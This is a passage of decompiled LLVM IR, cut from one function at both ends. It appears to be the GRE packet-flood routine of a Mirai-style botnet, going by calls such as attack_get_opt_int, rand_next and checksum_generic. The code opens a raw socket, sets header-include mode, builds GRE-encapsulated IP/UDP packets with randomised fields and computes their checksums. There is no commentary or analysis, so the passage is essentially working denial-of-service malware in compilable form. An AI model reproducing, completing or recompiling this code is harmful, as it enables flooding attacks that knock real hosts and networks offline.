  %v6_8950 = call i32 @attack_get_opt_int(i32 %v0_8948, i32* %v5_8950, i32 6, i32 65535, i32 %v1_8938)
  %v0_895c = load i32, i32* @r4, align 4
  store i32 %v0_895c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_8968 = load i32, i32* @r5, align 4
  store i32 %v0_8968, i32* %r0.global-to-local, align 4
  %v5_896c = inttoptr i32 %v0_895c to i32*
  %v6_896c = call i32 @attack_get_opt_int(i32 %v0_8968, i32* %v5_896c, i32 7, i32 65535, i32 %v6_8950)
  %v0_8970 = load i32, i32* @r4, align 4
  store i32 %v0_8970, i32* %r1.global-to-local, align 4
  %v0_8974 = load i32, i32* @sb, align 4
  store i32 %v0_8974, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_896c, i32* @r8, align 4
  %v0_8980 = load i32, i32* @r5, align 4
  store i32 %v0_8980, i32* %r0.global-to-local, align 4
  %v5_8984 = inttoptr i32 %v0_8970 to i32*
  %v6_8984 = call i32 @attack_get_opt_int(i32 %v0_8980, i32* %v5_8984, i32 %v0_8974, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8994 = load i32, i32* @r4, align 4
  store i32 %v0_8994, i32* %r1.global-to-local, align 4
  %v0_8998 = load i32, i32* @r5, align 4
  store i32 %v0_8998, i32* %r0.global-to-local, align 4
  %v5_899c = inttoptr i32 %v0_8994 to i32*
  %v6_899c = call i32 @attack_get_opt_int(i32 %v0_8998, i32* %v5_899c, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_89a4 = urem i32 %v6_899c, 256
  store i32 %v1_89a4, i32* %ip.global-to-local, align 4
  %v0_89a8 = load i32, i32* @r4, align 4
  store i32 %v0_89a8, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_89b0 = load i32, i32* @sb, align 4
  store i32 %v0_89b0, i32* %r3.global-to-local, align 4
  %v0_89b4 = load i32, i32* @r5, align 4
  store i32 %v0_89b4, i32* %r0.global-to-local, align 4
  %v5_89bc = inttoptr i32 %v0_89a8 to i32*
  %v6_89bc = call i32 @attack_get_opt_int(i32 %v0_89b4, i32* %v5_89bc, i32 18, i32 %v0_89b0, i32 %v1_89a4)
  %v0_89c4 = load i32, i32* @r4, align 4
  store i32 %v0_89c4, i32* %r1.global-to-local, align 4
  %v2_89c8 = load i32, i32* @global_var_23a2c.55, align 4
  store i32 %v2_89c8, i32* %r3.global-to-local, align 4
  store i32 %v6_89bc, i32* @r7, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_89d4 = load i32, i32* @r5, align 4
  store i32 %v0_89d4, i32* %r0.global-to-local, align 4
  %v5_89d8 = inttoptr i32 %v0_89c4 to i32*
  %v6_89d8 = call i32 @attack_get_opt_int(i32 %v0_89d4, i32* %v5_89d8, i32 24, i32 %v2_89c8, i32 ptrtoint (i32* @0 to i32))
  %v0_89e0 = load i32, i32* @sb, align 4
  store i32 %v0_89e0, i32* %r0.global-to-local, align 4
  %v1_89e4 = inttoptr i32 %v0_89e0 to i32*
  %v2_89e4 = call i32 @__GI_time(i32* %v1_89e4)
  %v1_89e8 = load i32, i32* @r6, align 4
  %v2_89e8 = add i32 %v1_89e8, %v2_89e4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_89fc = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_89fc, i32* %r0.global-to-local, align 4
  %v7_8a00 = icmp eq i32 %v3_89fc, -1
  store i1 %v7_8a00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8a00, label %dec_label_pc_8f38, label %dec_label_pc_8a0c

dec_label_pc_8a0c:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_8a14 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_8a14, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_8a1c = load i32, i32* @sb, align 4
  store i32 %v0_8a1c, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_8a28 = call i32 @__GI_setsockopt(i32 %v3_89fc, i32 %v0_8a1c, i32 3, i32 %v6_8a14, i32 4)
  store i32 %v5_8a28, i32* %r0.global-to-local, align 4
  %v7_8a2c = icmp eq i32 %v5_8a28, -1
  store i1 %v7_8a2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8a2c, label %dec_label_pc_8f44, label %dec_label_pc_8a34

dec_label_pc_8a34:                                ; preds = %dec_label_pc_8a0c
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v3_8a3c = mul i32 %v6_8950, 65536
  store i32 %v3_8a3c, i32* %r1.global-to-local, align 4
  %v0_8a40 = load i32, i32* @r8, align 4
  %v0_8a44 = load i32, i32* %fp.global-to-local, align 4
  %v3_8a44 = mul i32 %v0_8a44, 65536
  store i32 %v3_8a44, i32* %fp.global-to-local, align 4
  %v0_8a48 = load i32, i32* @r7, align 4
  %v1_8a48 = urem i32 %v0_8a48, 256
  store i32 %v1_8a48, i32* @r7, align 4
  %v3_8a4c = urem i32 %v0_8a44, 65536
  store i32 %v3_8a4c, i32* %r3.global-to-local, align 4
  %v3_8a50 = urem i32 %v6_8950, 65536
  store i32 %v3_8a50, i32* %ip.global-to-local, align 4
  %v3_8a54 = urem i32 %v0_8a40, 65536
  %v2_8a58 = icmp eq i32 %arg2, 0
  store i1 %v2_8a58, i1* %cpsr_z.global-to-local, align 1
  %v0_8a68 = load i32, i32* @sb, align 4
  store i32 %v0_8a68, i32* %stack_var_-44, align 4
  br i1 %v2_8a58, label %dec_label_pc_8c70.preheader, label %dec_label_pc_8a7c

dec_label_pc_8a7c:                                ; preds = %dec_label_pc_8a34
  %v3_8a40 = mul i32 %v0_8a40, 65536
  %v3_8a80 = mul i32 %v6_8984, 65536
  %v1_8a84 = add i32 %v3_8a80, 4325376
  %v0_8a44.not = or i32 %v0_8a44, -65536
  %v1_8a88 = xor i32 %v0_8a44.not, 65535
  %v3_8a94 = mul i32 %v1_8a88, 65536
  store i32 %v3_8a94, i32* @r6, align 4
  %tmp68 = udiv i32 %v1_8a84, 256
  %v3_8aac = and i32 %tmp68, 65280
  store i32 %v3_8aac, i32* %r3.global-to-local, align 4
  %v1_8ab0 = add i32 %v3_8a80, 524288
  %tmp69 = mul i32 %v0_8a44, 256
  %v3_8ab4 = and i32 %tmp69, 65280
  %v1_8ab8 = add i32 %v3_8a80, 1835008
  %tmp70 = mul nsw i32 %v1_8a88, 256
  %v3_8abc = and i32 %tmp70, 65280
  %v4_8ac0 = udiv i32 %v1_8a84, 16777216
  %v5_8ac0 = or i32 %v4_8ac0, %tmp68
  %v3_8ac8 = udiv i32 %v1_8ab8, 256
  %v5_8acc = trunc i32 %v5_8ac0 to i16
  %tmp71 = udiv i32 %v0_8a44, 256
  %v4_8ad0 = urem i32 %tmp71, 256
  %v5_8ad0 = or i32 %v4_8ad0, %v3_8ab4
  store i32 %v5_8ad0, i32* @r7, align 4
  %tmp72 = udiv i32 %v1_8a88, 256
  %v4_8ad4 = urem i32 %tmp72, 256
  %v5_8ad4 = or i32 %v4_8ad4, %v3_8abc
  store i32 %v5_8ad4, i32* @fp, align 4
  store i32 %v3_8a40, i32* %r2.global-to-local, align 4
  store i32 %v3_8a3c, i32* %r1.global-to-local, align 4
  %v1_8ae0 = and i32 %v3_8ac8, 65280
  %tmp73 = mul i32 %v6_8950, 256
  %v3_8ae4 = and i32 %tmp73, 65280
  %tmp74 = mul i32 %v0_8a40, 256
  %v3_8ae8 = and i32 %tmp74, 65280
  %v4_8af0 = udiv i32 %v1_8ab8, 16777216
  %v5_8af0 = or i32 %v1_8ae0, %v4_8af0
  store i32 %v5_8af0, i32* @r5, align 4
  %tmp75 = udiv i32 %v6_8950, 256
  %v4_8af4 = urem i32 %tmp75, 256
  %v5_8af4 = or i32 %v4_8af4, %v3_8ae4
  store i32 %v5_8af4, i32* %r0.global-to-local, align 4
  %tmp76 = udiv i32 %v0_8a40, 256
  %v4_8af8 = urem i32 %tmp76, 256
  %v5_8af8 = or i32 %v4_8af8, %v3_8ae8
  store i32 %v5_8af8, i32* %ip.global-to-local, align 4
  %tmp77 = udiv i32 %v1_8ab0, 256
  %v3_8afc = and i32 %tmp77, 65280
  store i32 %v3_8afc, i32* @lr, align 4
  %v5_8b08 = trunc i32 %v5_8af0 to i16
  %v4_8b0c = udiv i32 %v1_8ab0, 16777216
  %v5_8b0c = or i32 %v3_8afc, %v4_8b0c
  store i32 %v5_8b0c, i32* @r8, align 4
  store i32 %v0_8a68, i32* @r4, align 4
  %v1_8b74 = trunc i32 %v6_890c to i8
  %v2_8c28 = icmp eq i32 %v1_8a48, 0
  %sext = mul nuw i32 %v5_8af4, 65536
  %v4_8c4c = sdiv i32 %sext, 65536
  %sext7 = mul nuw i32 %v5_8af8, 65536
  %v4_8c54 = sdiv i32 %sext7, 65536
  br label %dec_label_pc_8b14

dec_label_pc_8b14:                                ; preds = %bb80, %dec_label_pc_8a7c
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_8b20 = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_8b20, i32* %r0.global-to-local, align 4
  %v3_8b28 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8b28, i32* %r2.global-to-local, align 4
  %v2_8b2c = load i32, i32* @r4, align 4
  %v5_8b2c = mul i32 %v2_8b2c, 4
  %v6_8b2c = add i32 %v5_8b2c, %v2_88b8
  %v7_8b2c = inttoptr i32 %v6_8b2c to i32*
  store i32 %v2_8b20, i32* %v7_8b2c, align 4
  store i32 %v2_88b8, i32* %r1.global-to-local, align 4
  %v0_8b34 = load i32, i32* %r2.global-to-local, align 4
  %v3_8b34 = mul i32 %v0_8b34, 32
  store i32 %v3_8b34, i32* %r3.global-to-local, align 4
  %v4_8b38 = mul i32 %v0_8b34, 4
  %v5_8b38 = add i32 %v4_8b38, %v2_88b8
  %v6_8b38 = inttoptr i32 %v5_8b38 to i32*
  %v7_8b38 = load i32, i32* %v6_8b38, align 4
  store i32 %v7_8b38, i32* %r4.global-to-local, align 4
  %v5_8b3c = mul i32 %v0_8b34, 24
  store i32 %v5_8b3c, i32* %r3.global-to-local, align 4
  %v1_8b40 = load i32, i32* @sl, align 4
  %v2_8b40 = add i32 %v1_8b40, %v5_8b3c
  store i32 %v2_8b40, i32* %lr.global-to-local, align 4
  %v1_8b44 = inttoptr i32 %v7_8b38 to i8*
  %v2_8b44 = load i8, i8* %v1_8b44, align 1
  %tmp = urem i8 %v2_8b44, 16
  %v1_8b48 = zext i8 %tmp to i32
  %v1_8b4c = or i32 %v1_8b48, 64
  store i32 %v1_8b4c, i32* %r3.global-to-local, align 4
  %v1_8b50 = trunc i32 %v1_8b4c to i8
  store i8 %v1_8b50, i8* %v1_8b44, align 1
  %v0_8b54 = load i32, i32* %r4.global-to-local, align 4
  %v1_8b54 = inttoptr i32 %v0_8b54 to i8*
  %v2_8b54 = load i8, i8* %v1_8b54, align 1
  %v1_8b58 = and i8 %v2_8b54, -16
  %v1_8b5c = or i8 %v1_8b58, 5
  store i32 %v1_8938, i32* %r3.global-to-local, align 4
  store i8 %v1_8b5c, i8* %v1_8b54, align 1
  store i32 %v6_88d0, i32* %r1.global-to-local, align 4
  %v2_8b6c = load i32, i32* %r4.global-to-local, align 4
  %v3_8b6c = add i32 %v2_8b6c, 1
  %v4_8b6c = inttoptr i32 %v3_8b6c to i8*
  store i8 %v5_88f0, i8* %v4_8b6c, align 1
  store i32 %v1_8914, i32* %r2.global-to-local, align 4
  %v2_8b74 = load i32, i32* %r4.global-to-local, align 4
  %v3_8b74 = add i32 %v2_8b74, 8
  %v4_8b74 = inttoptr i32 %v3_8b74 to i8*
  store i8 %v1_8b74, i8* %v4_8b74, align 1
  %v0_8b78 = load i32, i32* %r3.global-to-local, align 4
  %v2_8b78 = icmp eq i32 %v0_8b78, 0
  store i1 %v2_8b78, i1* %cpsr_z.global-to-local, align 1
  %v2_8b80 = load i32, i32* %r4.global-to-local, align 4
  %v3_8b80 = add i32 %v2_8b80, 2
  %v4_8b80 = inttoptr i32 %v3_8b80 to i16*
  store i16 %v5_8acc, i16* %v4_8b80, align 2
  %v2_8b88 = load i32, i32* %r4.global-to-local, align 4
  %v3_8b88 = add i32 %v2_8b88, 9
  %v4_8b88 = inttoptr i32 %v3_8b88 to i8*
  store i8 47, i8* %v4_8b88, align 1
  store i32 %v6_89d8, i32* %r3.global-to-local, align 4
  %v1_8b90 = load i32, i32* %r4.global-to-local, align 4
  %v2_8b90 = add i32 %v1_8b90, 12
  %v3_8b90 = inttoptr i32 %v2_8b90 to i32*
  store i32 %v6_89d8, i32* %v3_8b90, align 4
  %v0_8b94 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8b94, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_8b14
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_8b98 = load i32, i32* %r4.global-to-local, align 4
  %v4_8b98 = add i32 %v3_8b98, 6
  %v5_8b98 = inttoptr i32 %v4_8b98 to i16*
  store i16 64, i16* %v5_8b98, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_8b14, %bb
  %v0_8b9c = load i32, i32* %lr.global-to-local, align 4
  %v1_8b9c = add i32 %v0_8b9c, 16
  %v2_8b9c = inttoptr i32 %v1_8b9c to i32*
  %v3_8b9c = load i32, i32* %v2_8b9c, align 4
  store i32 22528, i32* %ip.global-to-local, align 4
  %v1_8ba4 = load i32, i32* %r4.global-to-local, align 4
  %v2_8ba4 = add i32 %v1_8ba4, 16
  %v3_8ba4 = inttoptr i32 %v2_8ba4 to i32*
  store i32 %v3_8b9c, i32* %v3_8ba4, align 4
  %v0_8ba8 = load i32, i32* %r4.global-to-local, align 4
  %v1_8ba8 = add i32 %v0_8ba8, 24
  store i32 %v1_8ba8, i32* %r0.global-to-local, align 4
  %v1_8bac = add i32 %v0_8ba8, 20
  store i32 %v1_8bac, i32* %r1.global-to-local, align 4
  %v0_8bb0 = load i32, i32* %ip.global-to-local, align 4
  %v1_8bb0 = add i32 %v0_8bb0, 101
  store i32 %v1_8bb0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v0_8bbc = load i32, i32* @r7, align 4
  %v1_8bbc = trunc i32 %v0_8bbc to i16
  %v3_8bbc = add i32 %v0_8ba8, 4
  %v4_8bbc = inttoptr i32 %v3_8bbc to i16*
  store i16 %v1_8bbc, i16* %v4_8bbc, align 2
  %v0_8bc0 = load i32, i32* %ip.global-to-local, align 4
  %v1_8bc0 = trunc i32 %v0_8bc0 to i16
  %v2_8bc0 = load i32, i32* %r1.global-to-local, align 4
  %v3_8bc0 = add i32 %v2_8bc0, 2
  %v4_8bc0 = inttoptr i32 %v3_8bc0 to i16*
  store i16 %v1_8bc0, i16* %v4_8bc0, align 2
  %v0_8bc4 = load i32, i32* %r3.global-to-local, align 4
  %v1_8bc4 = trunc i32 %v0_8bc4 to i8
  %v2_8bc4 = load i32, i32* %r0.global-to-local, align 4
  %v3_8bc4 = add i32 %v2_8bc4, 13
  %v4_8bc4 = inttoptr i32 %v3_8bc4 to i8*
  store i8 %v1_8bc4, i8* %v4_8bc4, align 1
  %v0_8bc8 = load i32, i32* %r2.global-to-local, align 4
  %v1_8bc8 = trunc i32 %v0_8bc8 to i8
  %v2_8bc8 = load i32, i32* %r0.global-to-local, align 4
  %v3_8bc8 = add i32 %v2_8bc8, 12
  %v4_8bc8 = inttoptr i32 %v3_8bc8 to i8*
  store i8 %v1_8bc8, i8* %v4_8bc8, align 1
  %v0_8bcc = load i32, i32* %r4.global-to-local, align 4
  %v1_8bcc = add i32 %v0_8bcc, 38
  %v2_8bcc = inttoptr i32 %v1_8bcc to i8*
  %v3_8bcc = load i8, i8* %v2_8bcc, align 1
  %tmp86 = urem i8 %v3_8bcc, 16
  %v1_8bd0 = zext i8 %tmp86 to i32
  %v1_8bd4 = or i32 %v1_8bd0, 64
  store i32 %v1_8bd4, i32* %r3.global-to-local, align 4
  %v1_8bd8 = trunc i32 %v1_8bd4 to i8
  store i8 %v1_8bd8, i8* %v2_8bcc, align 1
  %v0_8bdc = load i32, i32* %r4.global-to-local, align 4
  %v1_8bdc = add i32 %v0_8bdc, 38
  %v2_8bdc = inttoptr i32 %v1_8bdc to i8*
  %v3_8bdc = load i8, i8* %v2_8bdc, align 1
  %v4_8bdc = zext i8 %v3_8bdc to i32
  %v1_8be0 = and i32 %v4_8bdc, 240
  %v1_8be4 = or i32 %v1_8be0, 5
  store i32 %v1_8be4, i32* %r2.global-to-local, align 4
  %v1_8be8 = trunc i32 %v1_8be4 to i8
  store i8 %v1_8be8, i8* %v2_8bdc, align 1
  store i32 %v6_88d0, i32* %ip.global-to-local, align 4
  %v0_8bf0 = load i32, i32* %r4.global-to-local, align 4
  %v1_8bf0 = add i32 %v0_8bf0, 38
  store i32 %v1_8bf0, i32* @r5, align 4
  %v3_8bf4 = add i32 %v0_8bf0, 39
  %v4_8bf4 = inttoptr i32 %v3_8bf4 to i8*
  store i8 %v5_88f0, i8* %v4_8bf4, align 1
  store i32 %v5_8af0, i32* %lr.global-to-local, align 4
  %v2_8bfc = load i32, i32* @r5, align 4
  %v3_8bfc = add i32 %v2_8bfc, 2
  %v4_8bfc = inttoptr i32 %v3_8bfc to i16*
  store i16 %v5_8b08, i16* %v4_8bfc, align 2
  store i32 %v1_8914, i32* %r1.global-to-local, align 4
  %v0_8c04 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8c04, label %.thread8, label %bb78

.thread8:                                         ; preds = %.thread
  store i32 17, i32* %r3.global-to-local, align 4
  br label %bb79

bb78:                                             ; preds = %.thread
  store i32 64, i32* %r2.global-to-local, align 4
  store i32 17, i32* %r3.global-to-local, align 4
  %v3_8c0c = load i32, i32* @r5, align 4
  %v4_8c0c = add i32 %v3_8c0c, 6
  %v5_8c0c = inttoptr i32 %v4_8c0c to i16*
  store i16 64, i16* %v5_8c0c, align 2
  %v0_8c10.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t85 = trunc i32 %v0_8c10.pre to i8
  br label %bb79

bb79:                                             ; preds = %.thread8, %bb78
  %v6_890c.sink.off0 = phi i8 [ %v1_8b74, %.thread8 ], [ %extract.t85, %bb78 ]
  %v2_8c10 = load i32, i32* @r5, align 4
  %v3_8c10 = add i32 %v2_8c10, 8
  %v4_8c10 = inttoptr i32 %v3_8c10 to i8*
  store i8 %v6_890c.sink.off0, i8* %v4_8c10, align 1
  %v0_8c14 = load i32, i32* %r3.global-to-local, align 4
  %v1_8c14 = trunc i32 %v0_8c14 to i8
  %v2_8c14 = load i32, i32* @r5, align 4
  %v3_8c14 = add i32 %v2_8c14, 9
  %v4_8c14 = inttoptr i32 %v3_8c14 to i8*
  store i8 %v1_8c14, i8* %v4_8c14, align 1
  %v0_8c18 = load i32, i32* @fp, align 4
  %v1_8c18 = trunc i32 %v0_8c18 to i16
  %v2_8c18 = load i32, i32* @r5, align 4
  %v3_8c18 = add i32 %v2_8c18, 4
  %v4_8c18 = inttoptr i32 %v3_8c18 to i16*
  store i16 %v1_8c18, i16* %v4_8c18, align 2
  %v0_8c1c = call i32 @rand_next()
  store i32 %v0_8c1c, i32* %r0.global-to-local, align 4
  store i32 %v1_8a48, i32* %ip.global-to-local, align 4
  store i1 %v2_8c28, i1* %cpsr_z.global-to-local, align 1
  %v1_8c2c = sub i32 1023, %v0_8c1c
  store i32 %v1_8c2c, i32* %r3.global-to-local, align 4
  br i1 %v2_8c28, label %.thread9, label %.thread10

.thread9:                                         ; preds = %bb79
  %v2_8c34 = load i32, i32* @r5, align 4
  %v3_8c34 = add i32 %v2_8c34, 16
  %v4_8c34 = inttoptr i32 %v3_8c34 to i32*
  store i32 %v1_8c2c, i32* %v4_8c34, align 4
  br label %bb80

.thread10:                                        ; preds = %bb79
  %v1_8c30 = load i32, i32* %r4.global-to-local, align 4
  %v2_8c30 = add i32 %v1_8c30, 16
  %v3_8c30 = inttoptr i32 %v2_8c30 to i32*
  %v4_8c30 = load i32, i32* %v3_8c30, align 4
  store i32 %v4_8c30, i32* %r3.global-to-local, align 4
  %v2_8c38 = load i32, i32* @r5, align 4
  %v3_8c38 = add i32 %v2_8c38, 16
  %v4_8c38 = inttoptr i32 %v3_8c38 to i32*
  store i32 %v4_8c30, i32* %v4_8c38, align 4
  br label %bb80

bb80:                                             ; preds = %.thread9, %.thread10
  %v1_8c3c = load i32, i32* @r5, align 4
  %v2_8c3c = add i32 %v1_8c3c, 12
  %v3_8c3c = inttoptr i32 %v2_8c3c to i32*
  store i32 %v0_8c1c, i32* %v3_8c3c, align 4
  %v3_8c40 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8c40, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @lr, align 4
  %v0_8c48 = load i32, i32* %r4.global-to-local, align 4
  %v1_8c48 = add i32 %v0_8c48, 58
  store i32 %v1_8c48, i32* @r6, align 4
  store i32 %v4_8c4c, i32* %r1.global-to-local, align 4
  %v1_8c50 = add i32 %v3_8c40, 1
  store i32 %v1_8c50, i32* @r4, align 4
  store i32 %v4_8c54, i32* %r2.global-to-local, align 4
  %v9_8c58 = icmp eq i32 %v1_8c50, %arg2
  store i1 %v9_8c58, i1* %cpsr_z.global-to-local, align 1
  %v0_8c5c = load i32, i32* @r8, align 4
  %v1_8c5c = trunc i32 %v0_8c5c to i16
  %v3_8c5c = add i32 %v0_8c48, 62
  %v4_8c5c = inttoptr i32 %v3_8c5c to i16*
  store i16 %v1_8c5c, i16* %v4_8c5c, align 2
  %v0_8c60 = load i32, i32* %r1.global-to-local, align 4
  %v1_8c60 = trunc i32 %v0_8c60 to i16
  %v2_8c60 = load i32, i32* @r6, align 4
  %v3_8c60 = inttoptr i32 %v2_8c60 to i16*
  store i16 %v1_8c60, i16* %v3_8c60, align 2
  %v0_8c64 = load i32, i32* %r2.global-to-local, align 4
  %v1_8c64 = trunc i32 %v0_8c64 to i16
  %v2_8c64 = load i32, i32* @r6, align 4
  %v3_8c64 = add i32 %v2_8c64, 2
  %v4_8c64 = inttoptr i32 %v3_8c64 to i16*
  store i16 %v1_8c64, i16* %v4_8c64, align 2
  %v0_8c68 = load i32, i32* @r4, align 4
  store i32 %v0_8c68, i32* %stack_var_-44, align 4
  %v5_8c6c = icmp slt i32 %v1_8c50, %arg2
  br i1 %v5_8c6c, label %dec_label_pc_8b14, label %dec_label_pc_8c70.preheader

dec_label_pc_8c70.preheader:                      ; preds = %bb80, %dec_label_pc_8a34
  %v1_8c8c = add i32 %v6_8984, 8
  %v1_8c90 = add i32 %v6_8984, 66
  %v2_8c9c = icmp eq i32 %v6_89d8, -1
  %v7_8c9c = icmp eq i32 %v6_89d8, -1
  %v3_8e94 = icmp eq i32 %v3_8a4c, 65535
  %v2_8ee4 = icmp eq i32 %v1_8a48, 0
  %v2_8cf8 = ptrtoint i32* %stack_var_-48 to i32
  %v2_8d10 = ptrtoint i32* %stack_var_-52 to i32
  %v2_8d20 = ptrtoint i32* %stack_var_-56 to i32
  %v2_8d2c = ptrtoint i32* %stack_var_-54 to i32
  %v2_8d40 = icmp eq i32 %v1_89a4, 0
  br label %dec_label_pc_8c70

dec_label_pc_8c70:                                ; preds = %dec_label_pc_8c70.preheader, %dec_label_pc_8f24
  store i1 %v2_8a58, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_8a58, label %dec_label_pc_8f24, label %dec_label_pc_8c84

dec_label_pc_8c84:                                ; preds = %dec_label_pc_8c70
  store i32 %v6_8984, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v1_8c8c, i32* @fp, align 4
  store i32 %v1_8c90, i32* @sb, align 4
  br label %dec_label_pc_8df8

dec_label_pc_8c98:                                ; preds = %dec_label_pc_8df8
  store i32 %v6_89d8, i32* %r1.global-to-local, align 4
  store i1 %v7_8c9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8c9c, label %dec_label_pc_8e84, label %dec_label_pc_8ca4

dec_label_pc_8ca4:                                ; preds = %dec_label_pc_8e24, %dec_label_pc_8c98
  store i32 %v3_8a4c, i32* %r2.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_8e94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_8e94, label %dec_label_pc_8ea0, label %dec_label_pc_8cb8

dec_label_pc_8cb8:                                ; preds = %dec_label_pc_8e84.dec_label_pc_8cb8_crit_edge, %dec_label_pc_8ca4
  %v1_8cbc = phi i32 [ %v1_8cbc.pre, %dec_label_pc_8e84.dec_label_pc_8cb8_crit_edge ], [ 65535, %dec_label_pc_8ca4 ]
  store i32 %v3_8a50, i32* %r3.global-to-local, align 4
  %v9_8cbc = icmp eq i32 %v3_8a50, %v1_8cbc
  store i1 %v9_8cbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8cbc, label %dec_label_pc_8ec8, label %dec_label_pc_8cc4

dec_label_pc_8cc4:                                ; preds = %dec_label_pc_8ea0, %dec_label_pc_8cb8
  %v1_8cc8 = phi i32 [ %v1_8ec0, %dec_label_pc_8ea0 ], [ %v1_8cbc, %dec_label_pc_8cb8 ]
  store i32 %v3_8a54, i32* %ip.global-to-local, align 4
  %v9_8cc8 = icmp eq i32 %v3_8a54, %v1_8cc8
  store i1 %v9_8cc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8cc8, label %dec_label_pc_8edc, label %dec_label_pc_8cd0

dec_label_pc_8cd0:                                ; preds = %dec_label_pc_8ec8, %dec_label_pc_8cc4
  store i32 %v1_8a48, i32* @lr, align 4
  store i1 %v2_8ee4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8ee4, label %dec_label_pc_8ef8, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_8cd0
  %v1_8cd8 = load i32, i32* @r5, align 4
  %v2_8cd8 = add i32 %v1_8cd8, 16
  %v3_8cd8 = inttoptr i32 %v2_8cd8 to i32*
  %v4_8cd8 = load i32, i32* %v3_8cd8, align 4
  store i32 %v4_8cd8, i32* %r3.global-to-local, align 4
  %v2_8cdc = load i32, i32* @r6, align 4
  %v3_8cdc = add i32 %v2_8cdc, 16
  %v4_8cdc = inttoptr i32 %v3_8cdc to i32*
  store i32 %v4_8cd8, i32* %v4_8cdc, align 4
  br label %dec_label_pc_8ce4

dec_label_pc_8ce4:                                ; preds = %bb81, %.thread11, %dec_label_pc_8ef8
  %v0_8ce4 = call i32 @rand_next()
  store i32 %v0_8ce4, i32* %r0.global-to-local, align 4
  store i32 %v0_8ce4, i32* %stack_var_-48, align 4
  %v0_8cec = call i32 @rand_next()
  store i32 %v0_8cec, i32* %r0.global-to-local, align 4
  store i32 %v0_8cec, i32* %stack_var_-52, align 4
  %v0_8cf4 = call i32 @rand_next()
  store i32 %v2_8cf8, i32* %r1.global-to-local, align 4
  store i32 %v0_8cf4, i32* %stack_var_-56, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_8d04 = load i32, i32* @r7, align 4
  store i32 %v0_8d04, i32* %r0.global-to-local, align 4
  %v3_8d08 = call i32 @util_memcpy(i32 %v0_8d04, i32 %v2_8cf8, i32 4)
  %v0_8d0c = load i32, i32* @r7, align 4
  %v1_8d0c = add i32 %v0_8d0c, 6
  store i32 %v1_8d0c, i32* %r0.global-to-local, align 4
  store i32 %v2_8d10, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_8d18 = call i32 @util_memcpy(i32 %v1_8d0c, i32 %v2_8d10, i32 4)
  %v0_8d1c = load i32, i32* @r7, align 4
  %v1_8d1c = add i32 %v0_8d1c, 4
  store i32 %v1_8d1c, i32* %r0.global-to-local, align 4
  store i32 %v2_8d20, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_8d28 = call i32 @util_memcpy(i32 %v1_8d1c, i32 %v2_8d20, i32 2)
  store i32 %v2_8d2c, i32* %r1.global-to-local, align 4
  %v0_8d30 = load i32, i32* @r7, align 4
  %v1_8d30 = add i32 %v0_8d30, 10
  store i32 %v1_8d30, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_8d38 = call i32 @util_memcpy(i32 %v1_8d30, i32 %v2_8d2c, i32 2)
  store i32 %v3_8d38, i32* %r0.global-to-local, align 4
  store i32 %v1_89a4, i32* %r1.global-to-local, align 4
  store i1 %v2_8d40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8d40, label %dec_label_pc_8d48, label %dec_label_pc_8f04

dec_label_pc_8d48:                                ; preds = %dec_label_pc_8ce4, %dec_label_pc_8f04
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_8d4c = load i32, i32* @r5, align 4
  %v3_8d4c = add i32 %v2_8d4c, 10
  %v4_8d4c = inttoptr i32 %v3_8d4c to i16*
  store i16 0, i16* %v4_8d4c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_8d54 = load i32, i32* @r5, align 4
  store i32 %v0_8d54, i32* @r0, align 4
  %v2_8d58 = call i32 @checksum_generic(i32 %v0_8d54, i32 20)
